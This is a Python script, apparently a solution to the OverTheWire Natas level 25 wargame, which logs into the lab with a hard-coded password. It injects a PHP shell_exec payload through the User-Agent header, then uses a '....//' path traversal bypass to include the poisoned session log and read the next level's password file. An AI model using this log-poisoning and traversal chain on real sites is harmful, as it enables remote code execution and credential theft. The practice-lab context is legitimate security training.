import requests
from requests.auth import HTTPBasicAuth

ps25 = 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'
user = 'natas25'
basicAuth=HTTPBasicAuth(user,ps25)
url= "http://natas25.natas.labs.overthewire.org/" 
head = {"User-Agent": '<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>'}
session = requests.Session()
r = session.get(url,auth=basicAuth)
data ={
    "lang" :'....//....//....//....//....//var/www/natas/natas25/logs/natas25_'+session.cookies['PHPSESSID'] +'.log'
}
r = session.post(url,headers=head,data=data,auth=basicAuth)
print(r.text)
